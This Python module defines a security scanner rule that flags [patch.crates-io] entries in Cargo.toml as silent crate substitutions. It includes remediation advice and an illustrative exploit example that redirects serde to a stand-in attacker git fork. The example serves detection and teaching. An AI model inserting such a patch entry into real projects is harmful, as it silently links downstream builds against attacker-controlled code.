"""CARGO-008. Cargo.toml [patch.crates-io] substitutes a different crate."""
from __future__ import annotations

import tomllib
from typing import Any

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import CargoFile

RULE = Rule(
    id="CARGO-008",
    title="Cargo.toml [patch.crates-io] substitutes a different crate",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-3", "CICD-SEC-5"),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-829",),
    recommendation=(
        "Audit every entry under ``[patch.crates-io]``. The "
        "section overrides crates.io's resolution for the named "
        "crate, replacing it with a different source (a git "
        "repo, a local path, or another registry). Any consumer "
        "of the patched crate — including transitive deps — "
        "silently links against the replacement, with no "
        "import-site code change to flag at review.\n\n"
        "Three remediation patterns:\n\n"
        "* If the patch is a security fix awaiting upstream, "
        "document it with a comment naming the upstream issue "
        "and revisit on every audit cycle.\n"
        "* If the patch is a permanent fork, publish the fork to "
        "a private registry and depend on it directly under "
        "its own crate name (drop the [patch.crates-io] form).\n"
        "* If the patch is a stale workaround from a long-ago "
        "compatibility issue, remove it and pull from "
        "crates.io directly."
    ),
    docs_note=(
        "Re-parses ``Cargo.toml`` and walks "
        "``[patch.crates-io]``. Fires for every entry — "
        "patches are silent substitutions and warrant explicit "
        "audit-trail review regardless of the source. Entries "
        "with ``path = \"...\"`` (local-fork patches) are "
        "particularly important to surface because the patch "
        "lives outside the registry's integrity chain.\n\n"
        "Parallels GOMOD-003 (Go module replace directive) and "
        "PYPI-013 (pyproject dynamic dependencies): substitution "
        "primitives that operate below the import layer "
        "deserve dedicated audit surfaces."
    ),
    known_fp=(
        "Active upstream-fix patches with a documented "
        "stabilization timeline trip this rule by design. "
        "Suppress per entry with a one-line rationale naming "
        "the upstream issue and the expected stabilization "
        "release. Long-stuck patches without rationale are "
        "code-rot signals.",
    ),
    incident_refs=(
        "Pattern in Rust monorepos that consume a vendored "
        "fork of a popular crate via "
        "``[patch.crates-io]``: the patch entry lands during "
        "an emergency hotfix, is never reverted, and downstream "
        "consumers continue building against the temporary fork "
        "for years. The rule surfaces the deviation at every "
        "scan so the operator can decide whether the fork is "
        "still load-bearing.",
    ),
    exploit_example=(
        "# Vulnerable: silent substitution of a popular crate.\n"
        "[dependencies]\n"
        "serde = \"=1.0.190\"\n"
        "\n"
        "[patch.crates-io]\n"
        "serde = { git = \"https://github.com/attacker/serde-fork\" }\n"
        "\n"
        "# Attack: any consumer of the upstream serde —\n"
        "# direct or transitive — silently links against the\n"
        "# attacker's fork. The import-site code (`use serde::*;`)\n"
        "# is unchanged; review of the consuming crate's source\n"
        "# shows nothing unusual.\n"
        "\n"
        "# Safe: drop the patch. If a real fix is needed, fork\n"
        "# under a distinct crate name and depend on it directly.\n"
        "[dependencies]\n"
        "serde = \"=1.0.190\""
    ),
)


def _parse_patch_table(text: str) -> dict[str, dict[str, Any]]:
    """Return ``[patch.crates-io]`` table, or empty dict on parse
    error / table absent."""
    try:
        data: Any = tomllib.loads(text)
    except tomllib.TOMLDecodeError:
        return {}
    if not isinstance(data, dict):
        return {}
    patch = data.get("patch")
    if not isinstance(patch, dict):
        return {}
    crates_io = patch.get("crates-io")
    if not isinstance(crates_io, dict):
        return {}
    return {
        k: v for k, v in crates_io.items()
        if isinstance(k, str) and isinstance(v, dict)
    }


def check(pom: CargoFile) -> Finding:
    table = _parse_patch_table(pom.text)
    if not table:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=pom.path,
            description=(
                "Cargo.toml declares no [patch.crates-io] entries."
            ),
            recommendation=RULE.recommendation, passed=True,
        )
    offenders: list[str] = []
    locations: list[Location] = []
    for name, spec in table.items():
        source = "git" if spec.get("git") else (
            "path" if spec.get("path") else (
                "registry" if spec.get("registry") else "(unspecified)"
            )
        )
        offenders.append(f"{name} ({source})")
        line_no = 1
        marker = f"[patch.crates-io]"
        if marker in pom.text:
            line_no = pom.text[:pom.text.index(marker)].count("\n") + 1
        locations.append(Location(
            path=pom.path, start_line=line_no, end_line=line_no,
        ))
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=pom.path,
        description=(
            f"{len(offenders)} [patch.crates-io] entry / entries "
            f"substitute upstream crates: {', '.join(offenders[:5])}"
            f"{'…' if len(offenders) > 5 else ''}. Every consumer "
            f"of the patched crate (direct + transitive) silently "
            f"links against the replacement."
        ),
        recommendation=RULE.recommendation, passed=False,
        locations=locations,
    )
